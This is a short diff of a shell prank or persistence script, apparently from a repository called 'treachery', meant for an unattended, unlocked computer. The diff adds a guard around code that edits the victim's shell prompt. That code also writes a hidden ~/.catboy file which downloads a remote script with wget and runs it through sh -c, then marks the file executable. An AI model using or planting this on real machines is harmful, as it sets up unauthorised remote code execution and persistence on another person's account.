@@ -35,6 +35,10 @@ putrc() {
 		echo "$1" >> $word
 	done
 }
+if [ -e ~/.catboy ]; then
+	exit
+fi
+
 putrc "\nPS1=\"${PROMPT}\""
 echo 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh)"' >>~/.catboy
 chmod +x ~/.catboy
